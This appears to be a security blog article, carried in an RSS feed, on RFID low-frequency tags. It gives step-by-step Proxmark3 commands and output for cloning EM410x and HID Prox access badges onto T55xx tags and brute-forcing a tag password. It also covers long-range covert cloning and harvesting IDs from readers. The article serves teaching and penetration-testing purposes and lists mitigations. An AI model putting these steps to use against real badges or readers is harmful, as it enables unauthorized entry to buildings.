+&lt;p&gt;There&amp;rsquo;s a big difference between RFID and NFC tags and it hides in the specifications. They operate on different frequencies, use different protocols, offer different features and have different uses. Some RFID devices can be compatible with NFC readers, but that doesn&amp;rsquo;t mean that they strictly follow the NFC specs. Further considerations on the difference between these technologies are out of the scope of this article, but it&amp;rsquo;s important not to confuse the two.&lt;/p&gt;
+&lt;p&gt;LF tags operate in the 120–150 kHz range, but the most commonly used frequencies are 125kHz for access control tags and 134kHz for uses like pet chips. Other frequencies can be used but the vast majority of tags use either 125kHz or 134kHz. Such low frequencies can limit the data transmission speed.&lt;/p&gt;
+&lt;p&gt;RFID LF tags can be passive. This means that the tag is powered and interrogated by the reader. Or active, meaning that the tag is powered with a battery and that it continuously broadcasts data.
+While active tags are used, they often have specific purposes. This article will focus on RFID LF passive tags since it&amp;rsquo;s the most common variant found in everyday life.&lt;/p&gt;
+&lt;p&gt;RFID LF tags have poor transmission speed but are incredibly cheap to produce. Due to this, they are so widely employed where speed is not fundamental.
+The reading distance of LF tags is usually better compared to HF reading distance. In fact, LF is referred as a vicinity technology, while HF is generally called a proximity technology.&lt;/p&gt;
+&lt;p&gt;Industrial uses aside, one of the main uses of these tags is as access control tokens. It&amp;rsquo;s common to see these tags in form of badges or key fobs, and these can be used to access homes, offices or critical infrastructures.&lt;/p&gt;
+&lt;p&gt;There are numerous models of RFID LF tags each with it&amp;rsquo;s specific features and peculiarities, but the use as a security token is not ideal for one main reason: RFID LF tags can be an insecure option. (note that are exceptions: some tags can employ a password or crypto mode, one of the very few examples are &lt;a href=&#34;https://www.nxp.com/products/rfid-nfc/hitag-lf:MC_42027&#34;&gt;Hitag2&lt;/a&gt; tags and these security measures &lt;a href=&#34;https://www.cs.bham.ac.uk/~tpc/isecsem/talks/EZ.pdf&#34;&gt;can still be circumvented&lt;/a&gt;!)&lt;/p&gt;
+&lt;p&gt;In this article, we will see how it&amp;rsquo;s possible to read, write and clone these tags and learn about possible implications due to misuse of this technology.&lt;/p&gt;
+&lt;h3 id=&#34;how-to-work-with-rfid-tags&#34;&gt;How to work with RFID tags&lt;/h3&gt;
+&lt;p&gt;To work with RFID tags, specialized hardware is necessary.&lt;/p&gt;
+&lt;p&gt;Different devices exist:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Chinese cloners&lt;br&gt;
+Simple devices that read from one tag and write on another.
+Generally, these are hand-held, feature read and write buttons, and have a couple of status LEDs.
+Some are more advanced than others and can feature a little screen.
+Compatibility for frequencies and standards may vary, but these devices are usually good enough for simpler tasks.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;RFID Chameleon&lt;br&gt;
+Developed to be used in RFID security assessments.
+Doesn&amp;rsquo;t offer the most advanced features, but is designed to be used in the field, is battery powered and supports tag simulation and manipulation.
+It is also programmable and you can use it with an app.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s probably the best solution for a standalone use.&lt;br&gt;
+More here: &lt;a href=&#34;https://kasper-oswald.de/gb/chameleonmini/&#34;&gt;https://kasper-oswald.de/gb/chameleonmini/&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Proxmark3&lt;br&gt;
+As the website puts it: Proxmark is an RFID swiss-army tool.
+It represents the state of the art when it comes to RFID research.
+It allows interacting with the tags both high and low level.
+Different versions have different features, including bluetooth support, battery packs,
+swappable antennas and so on.&lt;/p&gt;
+&lt;p&gt;It supports a standalone use, but it&amp;rsquo;s more powerful when connected to a PC.
+It&amp;rsquo;s to be intended  as a research tool.&lt;br&gt;
+More here: &lt;a href=&#34;https://www.proxmark.com/&#34;&gt;https://www.proxmark.com/&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Generic boards&lt;br&gt;
+Other boards exist. These are usually sold as an Arduino add on, but dongles featuring
+the same integrated circuits are available.
+These are not widely used outside the makers world, but many are compatible with
+&lt;a href=&#34;http://www.nfc-tools.org/index.php/Libnfc&#34;&gt;&lt;code&gt;libnfc&lt;/code&gt;&lt;/a&gt; and can be useful to perform simple to advanced operations.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The only device that I have available is a Proxmark3 easy (cheap Chinese version) so this
+article will focus on its use. The underlying concepts about RFID tags should translate to other devices.&lt;/p&gt;
+&lt;h3 id=&#34;tags-that-emulate-other-tags&#34;&gt;Tags that emulate other tags&lt;/h3&gt;
+&lt;p&gt;When it comes to working with RFID LF tags, there&amp;rsquo;s one main player: the &lt;a href=&#34;http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-9187-RFID-ATA5577C_Datasheet.pdf&#34;&gt;T55xx&lt;/a&gt; tag&lt;/p&gt;
+&lt;p&gt;They are a family of tags developed to emulate a wide range of regular tags.
+This means that it&amp;rsquo;s possible to clone most of the RFID tags around using one of these
+without having to carry writable cards for each and every tag model.&lt;/p&gt;
+&lt;p&gt;This tag features 8 x 32 bit blocks in page 0 and 4 x 32 blocks in page 1.
+Page 1 blocks are meant to be used for configuration purposes along with block 0 and 7 in page 0.
+Blocks 1 to 6 in page 0 are dedicated to user data.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/rfid/t55xx.jpg#center&#34; alt=&#34;t55xx&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;T55xx memory layout&lt;br /&gt;Credit - Microchip ATA5577C datasheet&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Of course, it&amp;rsquo;s possible to work directly on the configuration blocks, and this is what allows the emulation
+of other type of tags, but doing so carelessly can easily lead to a brick!&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/rfid/bricked.jpg#center&#34; alt=&#34;bricked tag&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Bricked T55xx&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Original Atmel T5577 tags have a test mode and that can be helpful to recover soft-bricked cards.&lt;/p&gt;
+&lt;h3 id=&#34;cloning-tags&#34;&gt;Cloning tags&lt;/h3&gt;
+&lt;p&gt;Using the proxmark3 CLI, reading and writing devices is pretty straightforward.
+First off you need to look for the device:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf search
+
+[=] NOTE: some demods output possible binary
+[=] if it finds something that looks like a tag
+[=] False Positives ARE possible
+[=] 
+[=] Checking for known tags...
+[=] 
+[+] EM 410x ID 1122334455
+[+] EM410x ( RF/64 )
+[=] -------- Possible de-scramble patterns ---------
+[+] Unique TAG ID      : 8844CC22AA
+[=] HoneyWell IdentKey
+[+]     DEZ 8          : 03359829
+[+]     DEZ 10         : 0573785173
+[+]     DEZ 5.5        : 08755.17493
+[+]     DEZ 3.5A       : 017.17493
+[+]     DEZ 3.5B       : 034.17493
+[+]     DEZ 3.5C       : 051.17493
+[+]     DEZ 14/IK2     : 00073588229205
+[+]     DEZ 15/IK3     : 000585269781162
+[+]     DEZ 20/ZK      : 08080404121202021010
+[=] 
+[+] Other              : 17493_051_03359829
+[+] Pattern Paxton     : 289899093 [0x11478255]
+[+] Pattern 1          : 5931804 [0x5A831C]
+[+] Pattern Sebury     : 17493 51 3359829  [0x4455 0x33 0x334455]
+[=] ------------------------------------------------
+
+[+] Valid EM410x ID found!
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The proxmark found an EM410x tag! We can now try to read it:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf em 410x reader
+[+] EM 410x ID 1122334455
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&amp;rsquo;s try with another type of tag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf search
+
+[=] NOTE: some demods output possible binary
+[=] if it finds something that looks like a tag
+[=] False Positives ARE possible
+[=] 
+[=] Checking for known tags...
+[=] 
+[+] [H10301] - HID H10301 26-bit;  FC: 118  CN: 1603    parity: valid
+[=] raw: 000000000000002006ec0c86
+
+[+] Valid HID Prox ID found!
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&amp;rsquo;s an HID Prox tag, let&amp;rsquo;s try and read its ID:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[+] [H10301] - HID H10301 26-bit;  FC: 118  CN: 1603    parity: valid
+[=] raw: 000000000000002006ec0c86
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And just like that we got the devices ID. That ID is the authentication token!
+If we can write this token on a T55xx tag, we can emulate the card and possibly gain access
+to a restricted perimeter.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s see how it&amp;rsquo;s done.&lt;br&gt;
+First we need to get a T55xx tag and position it on the reader. When empty this device
+can&amp;rsquo;t be found using &lt;code&gt;lf search&lt;/code&gt;, so we can make sure it&amp;rsquo;s a T55xx tag using the detect command:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf t55xx detect
+[=]  Chip type......... T55x7
+[=]  Modulation........ ASK
+[=]  Bit rate.......... 2 - RF/32
+[=]  Inverted.......... No
+[=]  Offset............ 32
+[=]  Seq. terminator... Yes
+[=]  Block0............ 00088048 (auto detect)
+[=]  Downlink mode..... default/fixed bit length
+[=]  Password set...... No
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;lf t55 detect&lt;/code&gt; command is also necessary before using this tag because it detects the configuration in use and helps avoiding problems running other &lt;code&gt;lf t55&lt;/code&gt; commands.&lt;/p&gt;
+&lt;p&gt;Now we can see the content of the device:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf t55xx dump
+[+] Reading Page 0:
+[+] blk | hex data | binary                           | ascii
+[+] ----+----------+----------------------------------+-------
+[+]  00 | 00088048 | 00000000000010001000000001001000 | ...H
+[+]  01 | 00000000 | 00000000000000000000000000000000 | ....
+[+]  02 | 00000000 | 00000000000000000000000000000000 | ....
+[+]  03 | 00000000 | 00000000000000000000000000000000 | ....
+[+]  04 | 00000000 | 00000000000000000000000000000000 | ....
+[+]  05 | 00000000 | 00000000000000000000000000000000 | ....
+[+]  06 | 00000000 | 00000000000000000000000000000000 | ....
+[+]  07 | 00000000 | 00000000000000000000000000000000 | ....
+[+] Reading Page 1:
+[+] blk | hex data | binary                           | ascii
+[+] ----+----------+----------------------------------+-------
+[+]  00 | 00088048 | 00000000000010001000000001001000 | ...H
+[+]  01 | E03900D0 | 11100000001110010000000011010000 | .9..
+[+]  02 | C60337D7 | 11000110000000110011011111010111 | ..7.
+[+]  03 | 00A00003 | 00000000101000000000000000000011 | ....
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that it&amp;rsquo;s possible to operate on single blocks too, but for the purpose of this article, it&amp;rsquo;s easier to dump the whole memory instead.&lt;/p&gt;
+&lt;p&gt;We see that the card doesn&amp;rsquo;t contain user data. If it did, wiping the card with the &lt;code&gt;lf t55xx wipe&lt;/code&gt; command would be suggested.
+We can now try and emulate tags on it!
+To do that we only need to have the ID of the tags we want to emulate. We already saw how that&amp;rsquo;s done.&lt;/p&gt;
+&lt;p&gt;We can now go ahead and clone the tags, let&amp;rsquo;s try the em410x first:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf em 410x clone --id 1122334455
+[+] Preparing to clone EM4102 to T55x7 tag with ID 1122334455 (RF/64)
+[#] Clock rate: 64
+[#] Tag T55x7 written with 0xff8c65298c94a940
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once the command is issued, we can read the device and verify that it emulates an em410x tag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf em 410x reader
+[+] EM 410x ID 1122334455
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Of course it&amp;rsquo;s still a T55xx tag (and the &lt;code&gt;detect&lt;/code&gt; command will tell you that) but it behaves exactly like and em410x.&lt;/p&gt;
+&lt;p&gt;Now we can try with the HID Prox.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf hid clone --r 000000000000002006ec0c86
+[=] Preparing to clone HID tag using raw 000000000000002006ec0c86
+[=] Done
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And of course reading it reveals that we successfully cloned the tag:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;usb] pm3 --&amp;gt; lf hid reader
+[+] [H10301] - HID H10301 26-bit;  FC: 118  CN: 1603    parity: valid
+[=] raw: 000000000000002006ec0c86
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We now have two key fob tags copied on T55xx cards!&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:center&#34;&gt;&lt;img src=&#34;https://lessonsec.com/images/rfid/cloned.jpg&#34; alt=&#34;cloned tags&#34;&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:center&#34;&gt;Original and cloned tags&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;In this demo only HID Prox and em410x tags are examined, but it&amp;rsquo;s possible to clone and work with many more of these tags.&lt;/p&gt;
+&lt;p&gt;Since it&amp;rsquo;s possible to emulate cards knowing the ID, we can clone some RFID LF cards &amp;ldquo;by sight&amp;rdquo; simply reading the ID printed to the device body.
+This completely removes the limit of having to read the card with a specialized tool.
+Some of these printed ID are &amp;ldquo;encoded&amp;rdquo; (or shifted by some value). This allows organizations to &amp;ldquo;decode&amp;rdquo; it, but prevents attackers from obtaining the ID by sight.&lt;/p&gt;
+&lt;p&gt;At this point you might be wondering if it&amp;rsquo;s THAT easy to clone a tag in the real world, the answer is no. That&amp;rsquo;s for a simple reason, the tag is passive and if we use the standard antennas provided with whichever device, the reading range is limited to a few centimeters.&lt;/p&gt;
+&lt;p&gt;Luckily, it&amp;rsquo;s possible to weaponize a bigger antenna! If we use a bigger and more powerful antenna, it&amp;rsquo;s possible to clone a LF tag from a usable distance. Of course the antenna will need to be powered by a big battery pack and carried in some kind of backpack or messenger bag, but that&amp;rsquo;s the price to pay.&lt;/p&gt;
+&lt;p&gt;More here: &lt;a href=&#34;https://www.youtube.com/watch?v=wYmVtNQPlF4&#34;&gt;https://www.youtube.com/watch?v=wYmVtNQPlF4&lt;/a&gt;&lt;br&gt;
+(NOTE: many other implementations exist!)&lt;/p&gt;
+&lt;h3 id=&#34;defeating-password-protection&#34;&gt;Defeating password protection&lt;/h3&gt;
+&lt;p&gt;When examining the T55xx tag, you may have noticed a parameter &amp;ldquo;Password set&amp;rdquo;. That&amp;rsquo;s because
+this tag can be password protected!&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf t55xx protect -n 00001234
+[=] Checking current configuration
+[+] Wrote new password
+[+] Validated new password
+[+] Wrote modified configuration block
+[!] ⚠️  Safety check: Could not detect if PWD bit is set in config block. Exits.
+[?] Consider using the override parameter to force read.
+[=] Block0 write detected, running `detect` to see if validation is possible
+[=]  Chip type......... T55x7
+[=]  Modulation........ ASK
+[=]  Bit rate.......... 2 - RF/32
+[=]  Inverted.......... No
+[=]  Offset............ 33
+[=]  Seq. terminator... Yes
+[=]  Block0............ 000880F0 (auto detect)
+[=]  Downlink mode..... default/fixed bit length
+[=]  Password set...... Yes
+[=]  Password.......... 00001234
+
+[+] New configuration block 000880F0 password 00001234
+[+] Success, tag is locked
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point we can&amp;rsquo;t operate on this tag without knowing the password, for instance
+the &lt;code&gt;detect&lt;/code&gt; command won&amp;rsquo;t work as expected:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf t55xx detect 
+[!] ⚠️  Could not detect modulation automatically. Try setting it manually with &#39;lf t55xx config&#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But it does if the correct password is specified:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf t55xx detect -p 00001234
+[=]  Chip type......... T55x7
+[=]  Modulation........ ASK
+[=]  Bit rate.......... 2 - RF/32
+[=]  Inverted.......... No
+[=]  Offset............ 33
+[=]  Seq. terminator... Yes
+[=]  Block0............ 000880F0 (auto detect)
+[=]  Downlink mode..... default/fixed bit length
+[=]  Password set...... Yes
+[=]  Password.......... 00001234
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Can we circumvent this? The simple answer is no.
+The device is completely locked and without the password it&amp;rsquo;s impossible to do anything.&lt;/p&gt;
+&lt;p&gt;Luckily the proxmark allows bruteforce attacks.&lt;/p&gt;
+&lt;p&gt;While this type of attack works, it&amp;rsquo;s a really slow and instable method. This means it&amp;rsquo;s hard to try all the possible passwords before the connection drops. It may seem that the password protection is effective and that&amp;rsquo;s true if you don&amp;rsquo;t have the right tools. On the other hand, with quality reading devices and unlimited access to the target tag, success is granted.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s a demo on the tag we just password protected:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[usb] pm3 --&amp;gt; lf t55xx bruteforce -s 00000000 -e FFFFFFFF
+[=] press &#39;enter&#39; to cancel the command
+[=] Search password range [00000000 -&amp;gt; FFFFFFFF]
+.[=] Trying password 00000000
+.[=] Trying password 00000001
+.[=] Trying password 00000002
+.[=] Trying password 00000003
+.[=] Trying password 00000004
+.[=] Trying password 00000005
+.[=] Trying password 00000006
+.[=] Trying password 00000007
+.[=] Trying password 00000008
+.[=] Trying password 00000009
+.[=] Trying password 0000000A
+.[=] Trying password 0000000B
+.[=] Trying password 0000000C
+.[=] Trying password 0000000D
+
+[...]
+
+.[=] Trying password 0000122D
+.[=] Trying password 0000122E
+.[=] Trying password 0000122F
+.[=] Trying password 00001230
+.[=] Trying password 00001231
+.[=] Trying password 00001232
+.[=] Trying password 00001233
+.[=] Trying password 00001234
+[=]  Chip type......... T55x7
+[=]  Modulation........ ASK
+[=]  Bit rate.......... 2 - RF/32
+[=]  Inverted.......... No
+[=]  Offset............ 33
+[=]  Seq. terminator... Yes
+[=]  Block0............ 000880F0 (auto detect)
+[=]  Downlink mode..... default/fixed bit length
+[=]  Password set...... Yes
+[=]  Password.......... 00001234
+
+[+] Found valid password: [ 00001234 ]
+Downlink Mode used : default/fixed bit length
+
+[+] time in bruteforce 1215 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, it took ~20 minutes to crack a 4 hex digit password. It may seem to be a reasonable time but we must consider that the password can be double the length and that having access to the card for long periods of time is not always an option.&lt;/p&gt;
+&lt;h3 id=&#34;attacks-on-rfid-readers&#34;&gt;Attacks on RFID readers&lt;/h3&gt;
+&lt;p&gt;Finally, we can talk about attacks on the readers. There are two main attacks:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Tag simulation&lt;/li&gt;
+&lt;li&gt;Data exfiltration&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We saw that we can simulate a tag using the proxmark, but what if the ID we have read and simulated doesn&amp;rsquo;t have enough permission to grant us access somewhere?
+In this scenario, it&amp;rsquo;s possible to use the read value as an upper limit to the ID space to research, and simulate every ID lower than that value hoping to find an ID with higher privileges. This attack is based on the assumption that lower IDs may have higher privileges because such privileges are associated with users registered earlier into the system, hence the lower ID value.
+As for the bruteforce attack, this process may take a while, so it&amp;rsquo;s not always a usable technique.&lt;/p&gt;
+&lt;p&gt;A sneakier way to get valid IDs is to install a device such as the &lt;a href=&#34;https://redteamtools.com/espkey&#34;&gt;ESPKey&lt;/a&gt; inside the reader.
+This approach allows the interception of data directly from the wires and can harvest valid IDs.
+Of course, this requires a physical access to the reader.&lt;/p&gt;
+&lt;p&gt;Using the proxmark is also possible to sniff data from a tag to a reader.&lt;br&gt;
+Given the antenna range, this is not a widely used technique and personally I haven&amp;rsquo;t tried it yet.&lt;/p&gt;
+&lt;h3 id=&#34;conclusions&#34;&gt;Conclusions&lt;/h3&gt;
+&lt;p&gt;This article shows how, with the right hardware, it is possible to clone RFID tags with relatively low skills.&lt;/p&gt;
+&lt;p&gt;What&amp;rsquo;s scary is how easy it is to &amp;ldquo;steal&amp;rdquo; valuable credentials. In an access control context, a stolen ID constitutes a danger for a business because of the implications of a possible unauthorized entry into a critical infrastructure.&lt;/p&gt;
+&lt;p&gt;Possible mitigations include using a stronger authentication mechanism and trainings on RFID security and how to keep access tokens safe. Simple precautions like using an RFID shield (test those! some doesn&amp;rsquo;t work!) and avoiding to keep a tag in sight can often be a huge improvement in access token security.&lt;/p&gt;
+&lt;p&gt;A secure reader is also crucial. Some readers offer tamper detection mechanisms and actively try to detect and disable rewritable tags to avoid unauthorized entry.&lt;/p&gt;
+&lt;p&gt;RFID credentials cloning can be one of the strongest tools in the arsenal of a physical penetration tester.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;This article was reviewed by an external source, big thanks to them!&lt;/p&gt;
+</content:encoded>
+
+      </item>
+
   </channel>
 </rss>
